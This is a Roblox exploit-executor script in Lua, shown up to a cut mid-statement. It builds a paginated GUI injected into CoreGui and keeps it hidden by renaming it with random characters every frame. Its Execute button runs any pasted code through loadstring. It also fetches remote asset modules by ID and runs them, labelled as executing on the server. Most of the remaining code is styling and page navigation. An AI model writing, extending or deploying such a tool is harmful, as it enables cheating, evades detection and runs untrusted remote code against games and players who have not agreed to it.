wait(math.random(3, 5))
local function ApplyRainbowBorder(parent)
	local function COROT()
		local script = Instance.new("LocalScript", parent)
		script.Name = "RainbowBorder"
		
		while true do
			for i = 1, 360, 1 do
				wait()
				script.Parent.BorderColor3 = Color3.fromHSV(i/360, 1, 1)
			end
		end
	end
	coroutine.wrap(COROT)()
end

local X1Y1 = UDim2.new(0.031, 0, 0.036, 0)
local X2Y1 = UDim2.new(0.271, 0, 0.036, 0)
local X3Y1 = UDim2.new(0.512, 0, 0.036, 0)
local X4Y1 = UDim2.new(0.753, 0, 0.036, 0)
local X1Y2 = UDim2.new(0.031, 0, 0.161, 0)
local X2Y2 = UDim2.new(0.271, 0, 0.161, 0)
local X3Y2 = UDim2.new(0.512, 0, 0.161, 0)
local X4Y2 = UDim2.new(0.753, 0, 0.161, 0)
local X1Y3 = UDim2.new(0.031, 0, 0.286, 0)
local X2Y3 = UDim2.new(0.271, 0, 0.286, 0)
local X3Y3 = UDim2.new(0.512, 0, 0.286, 0)
local X4Y3 = UDim2.new(0.753, 0, 0.286, 0)
local X1Y4 = UDim2.new(0.031, 0, 0.414, 0)
local X2Y4 = UDim2.new(0.271, 0, 0.414, 0)
local X3Y4 = UDim2.new(0.512, 0, 0.414, 0)
local X4Y4 = UDim2.new(0.753, 0, 0.414, 0)
local X1Y5 = UDim2.new(0.031, 0, 0.539, 0)
local X2Y5 = UDim2.new(0.271, 0, 0.539, 0)
local X3Y5 = UDim2.new(0.512, 0, 0.539, 0)
local X4Y5 = UDim2.new(0.753, 0, 0.539, 0)
local X1Y6 = UDim2.new(0.031, 0, 0.664, 0)
local X2Y6 = UDim2.new(0.271, 0, 0.664, 0)
local X3Y6 = UDim2.new(0.512, 0, 0.664, 0)
local X4Y6 = UDim2.new(0.753, 0, 0.664, 0)
local X1Y7 = UDim2.new(0.031, 0, 0.789, 0)
local X2Y7 = UDim2.new(0.271, 0, 0.789, 0)
local X3Y7 = UDim2.new(0.512, 0, 0.789, 0)
local X4Y7 = UDim2.new(0.753, 0, 0.789, 0)

local CurrentPage = 1
local TotalPage = 12

local function AddButton(parent, Name, position, callBack)
	local Buttons = Instance.new("TextButton", parent)
	Buttons.Name = Name
	Buttons.Size = UDim2.new(0, 104, 0, 29)
	Buttons.BorderSizePixel = 2
	Buttons.TextColor3 = Color3.new(1, 1, 1)
	Buttons.Text = Name
	Buttons.Position = position
	Buttons.BackgroundColor3 = Color3.new(0, 0, 0)
	Buttons.TextScaled = true
	Buttons.Font = Enum.Font.Arial
	Instance.new("Script", Buttons)
	Buttons.MouseButton1Click:Connect(callBack)
	if Buttons.Text == "" then
		Buttons.BorderSizePixel = 0
		Buttons.TextColor3 = Color3.new(1, 0, 0)
		Buttons.Text = "DELETED"
	end
	ApplyRainbowBorder(Buttons)
	print("Loaded", Name)
end

local word = {"+", "&", "-", "#", "<", "[", "�", "	", "\n", "!", "=", "{", "}", "/n", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0", "@", "�"}


local Ob = Instance.new("ScreenGui")
Ob.Parent = game.CoreGui
Ob.ResetOnSpawn = false
local function Eddrap()
	local script = Instance.new("LocalScript", Ob)
	script.Name = "AlwaysActive"
	
	while wait() do
		script.Parent.Enabled = true
	end
end
coroutine.wrap(Eddrap)()

local function Zlol()
	local script = Instance.new("LocalScript", Ob)
	script.Name = "ObfustacorName"
	
	while wait() do
		script.Parent.Name = word[math.random(1, #word)]..word[math.random(1, #word)]..word[math.random(1, #word)]..word[math.random(1, #word)]..word[math.random(1, #word)]..word[math.random(1, #word)]..word[math.random(1, #word)]..word[math.random(1, #word)]..word[math.random(1, #word)]..word[math.random(1, #word)]..word[math.random(1, #word)]..word[math.random(1, #word)]..word[math.random(1, #word)]..word[math.random(1, #word)]
	end
end
coroutine.wrap(Zlol)()

local gui = Instance.new("ScreenGui", Ob)
gui.Name = "Main"

local TopBar = Instance.new("Frame")
TopBar.Size = UDim2.new(0, 457, 0, 29)
TopBar.Position = UDim2.new(0.3, 0, 0.3, 0)
TopBar.BackgroundColor3 = Color3.new(0, 0, 0)
TopBar.BorderSizePixel = 2
TopBar.Active = true
TopBar.BackgroundTransparency = 0 
TopBar.Parent = gui
TopBar.Name = "Top"
ApplyRainbowBorder(TopBar)
local function EERUFD_fake_script() -- Topbar Draggify 
    local script = Instance.new('LocalScript', TopBar)
 
    local UserInputService = game:GetService("UserInputService")
    
    local gui = script.Parent
    
    local dragging
    local dragInput
    local dragStart
    local startPos
    
    local function update(input)
        local delta = input.Position - dragStart
        gui.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
    end
    
    gui.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
            dragging = true
            dragStart = input.Position
            startPos = gui.Position
    
            input.Changed:Connect(function()
                if input.UserInputState == Enum.UserInputState.End then
                    dragging = false
                end
            end)
        end
    end)
    
    gui.InputChanged:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
            dragInput = input
        end
    end)
    
    UserInputService.InputChanged:Connect(function(input)
        if input == dragInput and dragging then
            update(input)
        end
    end)
end
coroutine.wrap(EERUFD_fake_script)()


local SafeArea = Instance.new("Frame", TopBar)
SafeArea.Size = UDim2.new(1.1, 0, 0, 315)
SafeArea.Position = UDim2.new(0, -5, 1, 2)
SafeArea.BackgroundTransparency = 1
SafeArea.ClipsDescendants = true
SafeArea.Name = "SafeArea"

local Holder = Instance.new("Frame")
Holder.Size = UDim2.new(0, 457, 0, 311)
Holder.Position = UDim2.new(0, 5, 0, 0)
Holder.BackgroundColor3 = Color3.new(0, 0, 0)
Holder.BorderSizePixel = 2
Holder.BackgroundTransparency = 0 
Holder.Parent = SafeArea
Holder.Name = "Holder"
ApplyRainbowBorder(Holder)


local Title = Instance.new("TextLabel")
Title.Size = UDim2.new(1, 0, 1, 0)
Title.Position = UDim2.new(0, 5, 0, 0)
Title.BackgroundColor3 = Color3.new(0, 0, 0)
Title.BorderColor3 = Color3.new(0, 0, 0)
Title.BorderSizePixel = 1
Title.Text = "PRIVATE GUI TOP SECRET"
Title.BackgroundTransparency = 1 
Title.TextColor3 = Color3.new(255, 255, 255)
Title.Font = Enum.Font.Nunito
Title.Parent = TopBar
Title.Name = "Title"
Title.TextXAlignment = "Left"
Title.TextSize = 19

local Close = Instance.new("TextButton")
Close.Size = UDim2.new(0, 27, 0, 28)
Close.Position = UDim2.new(0.94, 0, 0, 0)
Close.BackgroundColor3 = Color3.new(0, 0, 0)
Close.BorderSizePixel = 2
Close.Text = "x"
Close.Name = "Close"
Close.BackgroundTransparency = 0 
Close.TextColor3 = Color3.new(255, 255, 255)
Close.Font = Enum.Font.Code
Close.Parent = TopBar
Close.TextScaled = true
Close.MouseButton1Click:Connect(function()
	gui.Enabled = false
end)
ApplyRainbowBorder(Close)

local Maxzimize = Instance.new("TextButton")
Maxzimize.Size = UDim2.new(0, 26, 0, 28)
Maxzimize.Position = UDim2.new(0.88, 0, 0, 0)
Maxzimize.BackgroundColor3 = Color3.new(0, 0, 0)
Maxzimize.BorderSizePixel = 2
Maxzimize.Text = "â–¡"
Maxzimize.Name = "Maximize"
Maxzimize.BackgroundTransparency = 0 
Maxzimize.TextColor3 = Color3.new(255, 255, 255)
Maxzimize.Parent = TopBar
Maxzimize.TextSize = 20
ApplyRainbowBorder(Maxzimize)
Maxzimize.MouseButton1Click:Connect(function()
local Ts = game:GetService("TweenService")
local Ti = TweenInfo.new(1, Enum.EasingStyle.Circular, Enum.EasingDirection.InOut, 0, false, 0)
local Tween = Ts:Create(TopBar, Ti, {Position = UDim2.new(0.3, 0, 0.3, 0)})
Tween:Play()
end)

local visible = true

local Mini = Instance.new("TextButton")
Mini.Size = UDim2.new(0, 26, 0, 28)
Mini.Position = UDim2.new(0.818, 0, 0, 0)
Mini.BackgroundColor3 = Color3.new(0, 0, 0)
Mini.BorderSizePixel = 2
Mini.Text = "━"
Mini.Name = "Minimize"
Mini.BackgroundTransparency = 0 
Mini.TextColor3 = Color3.new(255, 255, 255)
Mini.Font = Enum.Font.Arial
Mini.Parent = TopBar
Mini.TextSize = 15
ApplyRainbowBorder(Mini)
Mini.MouseButton1Click:Connect(function()
if visible == true then
local Ts = game:GetService("TweenService")
local Ti = TweenInfo.new(0.4, Enum.EasingStyle.Quint, Enum.EasingDirection.Out, 0, false, 0)
local Tween = Ts:Create(Holder, Ti, {Position = UDim2.new(0, 5, -1, 0)})
Tween:Play()
visible = false
else
local Ts = game:GetService("TweenService")
local Ti = TweenInfo.new(0.4, Enum.EasingStyle.Quint, Enum.EasingDirection.Out, 0, false, 0)
local Tween = Ts:Create(Holder, Ti, {Position = UDim2.new(0, 5, 0, 0)})
Tween:Play()
visible = true
end
end)

local secure = Instance.new("TextLabel")
secure.Size = UDim2.new(0.3, 0, 0.2, 0)
secure.Position = UDim2.new(0.32, 0, 0, 5)
secure.BackgroundColor3 = Color3.new(0, 0, 0)
secure.BorderSizePixel = 1
secure.Text = "AGGRESIVE"
secure.BackgroundTransparency = 1 
secure.TextColor3 = Color3.new(1, 0, 0)
secure.Font = Enum.Font.Nunito
secure.Parent = TopBar
secure.TextSize = 15
secure.Name = "IsSafe"
--local function Erude()
--	local script = Instance.new("LocalScript", secure)
--	script.Name = "RainbowText"
	
--	while true do
--		for i = 1, 360, 1 do
--			wait()
--			script.Parent.TextColor3 = Color3.fromHSV(i/360, 1, 1)
--		end
--	end
--end
--coroutine.wrap(Erude)()

local HomeP = Instance.new("Frame")
HomeP.Size = UDim2.new(0, 457, 0, 280)
HomeP.Position = UDim2.new(0, 0, 0.1, 0)
HomeP.BackgroundColor3 = Color3.new(1, 1, 1)
HomeP.BorderColor3 = Color3.new(0, 0, 0)
HomeP.BorderSizePixel = 0
HomeP.BackgroundTransparency = 1 
HomeP.Parent = Holder
HomeP.Name = "HomePage"
HomeP.Visible = true

local ServerP = Instance.new("Frame")
ServerP.Size = UDim2.new(0, 457, 0, 280)
ServerP.Position = UDim2.new(0, 0, 0.1, 0)
ServerP.BackgroundColor3 = Color3.new(1, 1, 1)
ServerP.BorderColor3 = Color3.new(0, 0, 0)
ServerP.BorderSizePixel = 1
ServerP.BackgroundTransparency = 1
ServerP.Parent = Holder
ServerP.Visible = false
ServerP.Name = "ServerPage"

local ScriptP = Instance.new("Frame")
ScriptP.Size = UDim2.new(0, 457, 0, 280)
ScriptP.Position = UDim2.new(0, 0, 0.1, 0)
ScriptP.BackgroundColor3 = Color3.new(1, 1, 1)
ScriptP.BorderColor3 = Color3.new(0, 0, 0)
ScriptP.BorderSizePixel = 1
ScriptP.BackgroundTransparency = 1 
ScriptP.Parent = Holder
ScriptP.Visible = false
ScriptP.Name = "ScriptPackPage"

local ExecutorP = Instance.new("ScrollingFrame")
ExecutorP.Size = UDim2.new(0, 457, 0, 280)
ExecutorP.Position = UDim2.new(0, 0, 0.1, 0)
ExecutorP.BackgroundColor3 = Color3.new(0, 0, 0)
ExecutorP.BorderColor3 = Color3.new(0, 0, 0)
ExecutorP.Parent = Holder
ExecutorP.ScrollBarThickness = 0
ExecutorP.Name = "ExecutorPage"
ExecutorP.BackgroundTransparency = 1
ExecutorP.Visible = false
ExecutorP.ScrollingDirection = "Y"

local List = Instance.new("UIListLayout")
List.HorizontalAlignment = Enum.HorizontalAlignment.Center
List.SortOrder = Enum.SortOrder.LayoutOrder
List.Padding = UDim.new(0, 5)
List.Parent = ExecutorP

local ExePage = Instance.new("Frame")
ExePage.Size = UDim2.new(0, 457, 0, 280)
ExePage.Position = UDim2.new(0, 0, 0, 0)
ExePage.BackgroundColor3 = Color3.new(0, 0, 0)
ExePage.BorderColor3 = Color3.new(0, 0, 0)
ExePage.BorderSizePixel = 0
ExePage.BackgroundTransparency = 0
ExePage.Parent = ExecutorP
ExePage.Name = "ExecutorSection"

local BoxInput = Instance.new("TextBox")
BoxInput.Size = UDim2.new(0, 435, 0, 230)
BoxInput.Position = UDim2.new(0, 10, 0, 10)
BoxInput.BackgroundColor3 = Color3.new(0, 0, 0)
BoxInput.BorderColor3 = Color3.new(1, 1, 1)
BoxInput.BorderSizePixel = 2
BoxInput.Text = ""
BoxInput.PlaceholderText = "--[[\n	Made by LIONARCH_HELON\n	Credits script by ELLMODZ And DavinGG\n	Also the Other too Thanks for Primadon and Exser by\n	BrokenSpawn102 Dont Forget to sub him\n	Private gui by FancyKid, PolpyKid, StigmaDude, and\n	Other's, And Also Thanks for use my Script :D\n	Inspired by Alif, made with Polaria Style\n  ]]"
BoxInput.TextColor3 = Color3.new(255, 1, 255)
BoxInput.BackgroundTransparency = 0
BoxInput.Font = Enum.Font.Code
BoxInput.TextSize = 15
BoxInput.Parent = ExePage
BoxInput.TextXAlignment = "Left"
BoxInput.TextYAlignment = "Top"
BoxInput.ClearTextOnFocus = false
BoxInput.MultiLine = true
BoxInput.Name = "InputCode"
BoxInput.PlaceholderColor3 = Color3.new(1, 1, 1)
ApplyRainbowBorder(BoxInput)

local Execute = Instance.new("TextButton")
Execute.Size = UDim2.new(0, 100, 0, 30)
Execute.Position = UDim2.new(0, 10, 0, 247)
Execute.BackgroundColor3 = Color3.new(0, 0, 0)
Execute.BorderColor3 = Color3.new(1, 1, 1)
Execute.BorderSizePixel = 2
Execute.Text = "Execute"
Execute.BackgroundTransparency = 0 
Execute.TextColor3 = Color3.new(255, 255, 255)
Execute.Font = Enum.Font.Nunito
Execute.Parent = ExePage
Execute.TextSize = 24
Execute.Name = "Execute"
Execute.MouseButton1Click:Connect(function()
	local scriptText = BoxInput.Text
		local assetId = scriptText:match("require%s*%(?%s*(%d+)%s*%)?")
	
		if assetId then
			local success, result = pcall(function()
				local objects = game:GetObjects("rbxassetid://" .. assetId)
				local obj = objects[1]
				if obj then
				obj.Parent = game.Players.LocalPlayer.PlayerGui
					if obj:IsA("ModuleScript") then
					require(obj)(game.Players.LocalPlayer)
					local modSuccess, modResult = pcall(function()
						return require(obj)
					end)
					if not modSuccess then
						warn("Error requiring module:", modResult)
					end
				end
			end
		end)
		if not success then
			warn("Error loading asset:", result)
		end
	else
		warn("Invalid require() syntax.\n    CallStack : \n Requiring asset "..math.random(1, 10)..math.random(1, 10)..math.random(1, 10)..math.random(1, 10)..math.random(1, 10)..math.random(1, 10)..math.random(1, 10)..math.random(1, 10)..math.random(1, 10)..math.random(1, 10).." . \n Required_asset_"..math.random(1, 10)..math.random(1, 10)..math.random(1, 10)..math.random(1, 10)..math.random(1, 10)..math.random(1, 10)..math.random(1, 10)..math.random(1, 10)..math.random(1, 10)..math.random(1, 10).." .MainModule, line 1 - by\n Required_asset_"..math.random(1, 10)..math.random(1, 10)..math.random(1, 10)..math.random(1, 10)..math.random(1, 10)..math.random(1, 10)..math.random(1, 10)..math.random(1, 10)..math.random(1, 10)..math.random(1, 10).." .MainModule, line 1 - by\n Required_asset_"..math.random(1, 10)..math.random(1, 10)..math.random(1, 10)..math.random(1, 10)..math.random(1, 10)..math.random(1, 10)..math.random(1, 10)..math.random(1, 10)..math.random(1, 10)..math.random(1, 10).." .MainModule, line 1 - by\n Required_asset_"..math.random(1, 10)..math.random(1, 10)..math.random(1, 10)..math.random(1, 10)..math.random(1, 10)..math.random(1, 10)..math.random(1, 10)..math.random(1, 10)..math.random(1, 10)..math.random(1, 10).." .MainModule, line 1 - by ")
	end
end)
Execute.MouseButton1Click:Connect(function()
	loadstring(BoxInput.Text)()
end)
ApplyRainbowBorder(Execute)

local Clear = Instance.new("TextButton")
Clear.Size = UDim2.new(0, 100, 0, 30)
Clear.Position = UDim2.new(0, 120, 0, 247)
Clear.BackgroundColor3 = Color3.new(0, 0, 0)
Clear.BorderColor3 = Color3.new(1, 1, 1)
Clear.BorderSizePixel = 2
Clear.Text = "Clear"
Clear.BackgroundTransparency = 0 
Clear.TextColor3 = Color3.new(255, 255, 255)
Clear.Font = Enum.Font.Nunito
Clear.Parent = ExePage
Clear.TextSize = 24
Clear.Name = "Clear"
Clear.MouseButton1Click:Connect(function()
	BoxInput.Text = ""
end)
ApplyRainbowBorder(Clear)

local huh = Instance.new("TextLabel")
huh.Size = UDim2.new(0, 10, 0, 10)
huh.Position = UDim2.new(0, 295, 0, 255)
huh.BackgroundColor3 = Color3.new(0, 0, 0)
huh.BorderColor3 = Color3.new(0, 0, 0)
huh.BorderSizePixel = 1
huh.Text = "Execute on :"
huh.BackgroundTransparency = 1 
huh.TextColor3 = Color3.new(255, 255, 255)
huh.Font = Enum.Font.SciFi
huh.Parent = ExePage
huh.Name = "huh"
huh.TextSize = 20

local hmm = Instance.new("TextLabel")
hmm.Size = UDim2.new(0, 10, 0, 10)
hmm.Position = UDim2.new(0, 380, 0, 255)
hmm.BackgroundColor3 = Color3.new(0, 0, 0)
hmm.BorderColor3 = Color3.new(0, 0, 0)
hmm.BorderSizePixel = 1
hmm.Text = "Server"
hmm.BackgroundTransparency = 1 
hmm.TextColor3 = Color3.new(0, 1, 0)
hmm.Font = Enum.Font.SciFi
hmm.Parent = ExePage
hmm.Name = "Hmm"
hmm.TextSize = 20

local OutputP = Instance.new("Frame")
OutputP.Size = UDim2.new(0, 457, 0, 280)
OutputP.Position = UDim2.new(0, 0, 0, 0)
OutputP.BackgroundColor3 = Color3.new(0, 0, 0)
OutputP.BorderColor3 = Color3.new(0, 0, 0)
OutputP.BorderSizePixel = 0
OutputP.BackgroundTransparency = 0
OutputP.Parent = ExecutorP

local ScrollOutput = Instance.new("ScrollingFrame")
ScrollOutput.Size = UDim2.new(0, 432, 0, 200)
ScrollOutput.Position = UDim2.new(0, 12, 0, 38)
ScrollOutput.BackgroundColor3 = Color3.new(0, 0, 0)
ScrollOutput.BorderColor3 = Color3.new(1, 1, 1)
ScrollOutput.BorderSizePixel = 2
ScrollOutput.Parent = OutputP
ScrollOutput.ScrollBarThickness = 0
ScrollOutput.ScrollingDirection = "Y"
ScrollOutput.BackgroundTransparency = 0 
ApplyRainbowBorder(ScrollOutput)

local TextOutput = Instance.new("TextLabel")
TextOutput.Size = UDim2.new(1, 0, 1, 0)
TextOutput.Position = UDim2.new(0, 0, 0, 0)
TextOutput.BackgroundColor3 = Color3.new(0, 0, 0)
TextOutput.BorderColor3 = Color3.new(1, 1, 1)
TextOutput.BorderSizePixel = 0
TextOutput.Text = "Click here to Enable Output"
TextOutput.BackgroundTransparency = 0
TextOutput.TextColor3 = Color3.new(255, 255, 255)
TextOutput.Font = Enum.Font.Code
TextOutput.Parent = ScrollOutput
TextOutput.TextSize = 15
TextOutput.TextXAlignment = "Left"
TextOutput.TextYAlignment = "Top"

local ClearOut = Instance.new("TextButton")
ClearOut.Size = UDim2.new(0, 250, 0, 30)
ClearOut.Position = UDim2.new(0, 100, 0, 247)
ClearOut.BackgroundColor3 = Color3.new(0, 0, 0)
ClearOut.BorderColor3 = Color3.new(1, 1, 1)
ClearOut.BorderSizePixel = 2
ClearOut.Text = "Clear Output"
ClearOut.BackgroundTransparency = 0 
ClearOut.TextColor3 = Color3.new(255, 255, 255)
ClearOut.Font = Enum.Font.Nunito
ClearOut.Parent = OutputP
ClearOut.TextSize = 24
ClearOut.MouseButton1Click:Connect(function()
	TextOutput.Text = ""
	ScrollOutput.CanvasSize = UDim2.new(0, 0, 0, 0)
end)
ApplyRainbowBorder(ClearOut)

local TiTle = Instance.new("TextLabel")
TiTle.Size = UDim2.new(1, 0, 0, 30)
TiTle.Position = UDim2.new(0, 0, 0, 0)
TiTle.BackgroundColor3 = Color3.new(0, 0, 0)
TiTle.BorderColor3 = Color3.new(1, 1, 1)
TiTle.BorderSizePixel = 2
TiTle.Text = "Output"
TiTle.BackgroundTransparency = 0 
TiTle.TextColor3 = Color3.new(255, 255, 255)
TiTle.Font = Enum.Font.Gotham
TiTle.Parent = OutputP
TiTle.TextSize = 18
ApplyRainbowBorder(TiTle)


local function COROTINE()
	local script = Instance.new("LocalScript", TextOutput)
	
	local textBox = script.Parent
-- Function to log messages in the TextBox without color formatting 

local function logToTextbox(message) 
	-- Simply append the message to the current TextBox text 	
	textBox.Text = textBox.Text .. "\n" .. message
	ScrollOutput.CanvasSize += UDim2.new(0, 0, 0, 75)
end  

-- Listen for messages from the developer console and log them in the TextBox 

game:GetService("LogService").MessageOut:Connect(function(message, messageType)
 	logToTextbox(message) 
end) 
end
coroutine.wrap(COROTINE)()


local exampleTabs = Instance.new("Frame")
exampleTabs.Size = UDim2.new(0, 457, 0, 280)
exampleTabs.Position = UDim2.new(0, 0, 0, 0)
exampleTabs.BackgroundColor3 = Color3.new(1, 1, 1)
exampleTabs.BorderColor3 = Color3.new(0, 0, 0)
exampleTabs.BorderSizePixel = 1
exampleTabs.BackgroundTransparency = 1
exampleTabs.Parent = nil
exampleTabs.Visible = false

local SPage1 = exampleTabs:Clone()
SPage1.Name = "SPage1"
SPage1.Parent = ScriptP
SPage1.Visible = true

local PageCount = Instance.new("TextLabel")
PageCount.Size = UDim2.new(0, 40, 0, 15)
PageCount.Position = UDim2.new(0.74, 0, 0.922, 0)
PageCount.BackgroundColor3 = Color3.new(1, 1, 1)
PageCount.BorderColor3 = Color3.new(0, 0, 0)
PageCount.BorderSizePixel = 1
PageCount.Text = "Page "..CurrentPage.." of "..TotalPage
PageCount.BackgroundTransparency = 1 
PageCount.TextColor3 = Color3.new(255, 255, 255)
PageCount.Font = Enum.Font.Arial
PageCount.Parent = SPage1
PageCount.TextSize = 15

local SPage2 = exampleTabs:Clone()
SPage2.Parent = ScriptP
SPage2.Name = "SPage2"
SPage2.Visible = false

local SPage3 = exampleTabs:Clone()
SPage3.Parent = ScriptP
SPage3.Name = "SPage2"
SPage3.Visible = false

local nextpage = Instance.new("TextButton")
nextpage.Size = UDim2.new(0, 34, 0, 15)
nextpage.Position = UDim2.new(0.9, 0, 0.922, 0)
nextpage.BackgroundColor3 = Color3.new(0, 0, 0)
nextpage.BorderColor3 = Color3.new(1, 1, 1)
nextpage.BorderSizePixel = 2
nextpage.Text = ">"
nextpage.BackgroundTransparency = 0 
nextpage.TextColor3 = Color3.new(255, 255, 255)
nextpage.Font = Enum.Font.Arial
nextpage.Parent = SPage2
nextpage.TextSize = 15
nextpage.MouseButton1Click:Connect(function()
	SPage3.Visible = true
	SPage2.Visible = false
end)
ApplyRainbowBorder(nextpage)

local PageCount = Instance.new("TextLabel")
PageCount.Size = UDim2.new(0, 40, 0, 15)
PageCount.Position = UDim2.new(0.74, 0, 0.922, 0)
PageCount.BackgroundColor3 = Color3.new(1, 1, 1)
PageCount.BorderColor3 = Color3.new(0, 0, 0)
PageCount.BorderSizePixel = 1
PageCount.Text = "Page 2 of "..TotalPage
PageCount.BackgroundTransparency = 1 
PageCount.TextColor3 = Color3.new(255, 255, 255)
PageCount.Font = Enum.Font.Arial
PageCount.Parent = SPage2
PageCount.TextSize = 15

local beforepage = Instance.new("TextButton")
beforepage.Size = UDim2.new(0, 40, 0, 15)
beforepage.Position = UDim2.new(0.58, 0, 0.922, 0)
beforepage.BackgroundColor3 = Color3.new(0, 0, 0)
beforepage.BorderColor3 = Color3.new(1, 1, 1)
beforepage.BorderSizePixel = 2
beforepage.Text = "<"
beforepage.BackgroundTransparency = 0 
beforepage.TextColor3 = Color3.new(255, 255, 255)
beforepage.Font = Enum.Font.Arial
beforepage.Parent = SPage2
beforepage.TextSize = 15
ApplyRainbowBorder(beforepage)
beforepage.MouseButton1Click:Connect(function()
	SPage1.Visible = true
	SPage2.Visible = false
end)

local PageCount = Instance.new("TextLabel")
PageCount.Size = UDim2.new(0, 40, 0, 15)
PageCount.Position = UDim2.new(0.74, 0, 0.922, 0)
PageCount.BackgroundColor3 = Color3.new(1, 1, 1)
PageCount.BorderColor3 = Color3.new(0, 0, 0)
PageCount.BorderSizePixel = 1
PageCount.Text = "Page 3 of "..TotalPage
PageCount.BackgroundTransparency = 1 
PageCount.TextColor3 = Color3.new(255, 255, 255)
PageCount.Font = Enum.Font.Arial
PageCount.Parent = SPage3
PageCount.TextSize = 15

local beforepage = Instance.new("TextButton")
beforepage.Size = UDim2.new(0, 40, 0, 15)
beforepage.Position = UDim2.new(0.58, 0, 0.922, 0)
beforepage.BackgroundColor3 = Color3.new(0, 0, 0)
beforepage.BorderColor3 = Color3.new(1, 1, 1)
beforepage.BorderSizePixel = 2
beforepage.Text = "<"
beforepage.BackgroundTransparency = 0 
beforepage.TextColor3 = Color3.new(255, 255, 255)
beforepage.Font = Enum.Font.Arial
beforepage.Parent = SPage3
beforepage.TextSize = 15
beforepage.MouseButton1Click:Connect(function()
	SPage2.Visible = true
	SPage3.Visible = false
end)
ApplyRainbowBorder(beforepage)

local SPage4 = exampleTabs:Clone()
SPage4.Name = "SPage4"
SPage4.Parent = ScriptP
SPage4.Visible = false

local PageCount = Instance.new("TextLabel")
PageCount.Size = UDim2.new(0, 40, 0, 15)
PageCount.Position = UDim2.new(0.74, 0, 0.922, 0)
PageCount.BackgroundColor3 = Color3.new(1, 1, 1)
PageCount.BorderColor3 = Color3.new(0, 0, 0)
PageCount.BorderSizePixel = 1
PageCount.Text = "Page 4 of "..TotalPage
PageCount.BackgroundTransparency = 1 
PageCount.TextColor3 = Color3.new(255, 255, 255)
PageCount.Font = Enum.Font.Arial
PageCount.Parent = SPage4
PageCount.TextSize = 15

local beforepage = Instance.new("TextButton")
beforepage.Size = UDim2.new(0, 40, 0, 15)
beforepage.Position = UDim2.new(0.58, 0, 0.922, 0)
beforepage.BackgroundColor3 = Color3.new(0, 0, 0)
beforepage.BorderColor3 = Color3.new(1, 1, 1)
beforepage.BorderSizePixel = 2
beforepage.Text = "<"
beforepage.BackgroundTransparency = 0 
beforepage.TextColor3 = Color3.new(255, 255, 255)
beforepage.Font = Enum.Font.Arial
beforepage.Parent = SPage4
beforepage.TextSize = 15
beforepage.MouseButton1Click:Connect(function()
	SPage3.Visible = true
	SPage4.Visible = false
end)
ApplyRainbowBorder(beforepage)

local nextpage = Instance.new("TextButton")
nextpage.Size = UDim2.new(0, 34, 0, 15)
nextpage.Position = UDim2.new(0.9, 0, 0.922, 0)
nextpage.BackgroundColor3 = Color3.new(0, 0, 0)
nextpage.BorderColor3 = Color3.new(1, 1, 1)
nextpage.BorderSizePixel = 2
nextpage.Text = ">"
nextpage.BackgroundTransparency = 0 
nextpage.TextColor3 = Color3.new(255, 255, 255)
nextpage.Font = Enum.Font.Arial
nextpage.Parent = SPage1
nextpage.TextSize = 15
nextpage.MouseButton1Click:Connect(function()
	SPage1.Visible = false
	SPage2.Visible = true
end)

ApplyRainbowBorder(nextpage)

local SPage5 = exampleTabs:Clone()
SPage5.Name = "SPage5"
SPage5.Visible = false
SPage5.Parent = ScriptP

local SPage6 = exampleTabs:Clone()
SPage6.Name = "SPage6"
SPage6.Visible = false
SPage6.Parent = ScriptP

local nextpage = Instance.new("TextButton")
nextpage.Size = UDim2.new(0, 34, 0, 15)
nextpage.Position = UDim2.new(0.9, 0, 0.922, 0)
nextpage.BackgroundColor3 = Color3.new(0, 0, 0)
nextpage.BorderColor3 = Color3.new(1, 1, 1)
nextpage.BorderSizePixel = 2
nextpage.Text = ">"
nextpage.BackgroundTransparency = 0 
nextpage.TextColor3 = Color3.new(255, 255, 255)
nextpage.Font = Enum.Font.Arial
nextpage.Parent = SPage5
nextpage.TextSize = 15
nextpage.MouseButton1Click:Connect(function()
	SPage5.Visible = false
	SPage6.Visible = true
end)
ApplyRainbowBorder(nextpage)

local PageCount = Instance.new("TextLabel")
PageCount.Size = UDim2.new(0, 40, 0, 15)
PageCount.Position = UDim2.new(0.74, 0, 0.922, 0)
PageCount.BackgroundColor3 = Color3.new(1, 1, 1)
PageCount.BorderColor3 = Color3.new(0, 0, 0)
PageCount.BorderSizePixel = 1
PageCount.Text = "Page 5 of "..TotalPage
PageCount.BackgroundTransparency = 1 
PageCount.TextColor3 = Color3.new(255, 255, 255)
PageCount.Font = Enum.Font.Arial
PageCount.Parent = SPage5
PageCount.TextSize = 15

local beforepage = Instance.new("TextButton")
beforepage.Size = UDim2.new(0, 40, 0, 15)
beforepage.Position = UDim2.new(0.58, 0, 0.922, 0)
beforepage.BackgroundColor3 = Color3.new(0, 0, 0)
beforepage.BorderColor3 = Color3.new(1, 1, 1)
beforepage.BorderSizePixel = 2
beforepage.Text = "<"
beforepage.BackgroundTransparency = 0 
beforepage.TextColor3 = Color3.new(255, 255, 255)
beforepage.Font = Enum.Font.Arial
beforepage.Parent = SPage5
beforepage.TextSize = 15
beforepage.MouseButton1Click:Connect(function()
	SPage4.Visible = true
	SPage5.Visible = false
end)
ApplyRainbowBorder(beforepage)

local SPage7 = exampleTabs:Clone()
SPage7.Name = "SPage7"
SPage7.Parent = ScriptP
SPage7.Visible = false

local nextpage = Instance.new("TextButton")
nextpage.Size = UDim2.new(0, 34, 0, 15)
nextpage.Position = UDim2.new(0.9, 0, 0.922, 0)
nextpage.BackgroundColor3 = Color3.new(0, 0, 0)
nextpage.BorderColor3 = Color3.new(1, 1, 1)
nextpage.BorderSizePixel = 2
nextpage.Text = ">"
nextpage.BackgroundTransparency = 0 
nextpage.TextColor3 = Color3.new(255, 255, 255)
nextpage.Font = Enum.Font.Arial
nextpage.Parent = SPage3
nextpage.TextSize = 15
nextpage.MouseButton1Click:Connect(function()
	SPage3.Visible = false
	SPage4.Visible = true
end)
ApplyRainbowBorder(nextpage)

local nextpage = Instance.new("TextButton")
nextpage.Size = UDim2.new(0, 34, 0, 15)
nextpage.Position = UDim2.new(0.9, 0, 0.922, 0)
nextpage.BackgroundColor3 = Color3.new(0, 0, 0)
nextpage.BorderColor3 = Color3.new(1, 1, 1)
nextpage.BorderSizePixel = 2
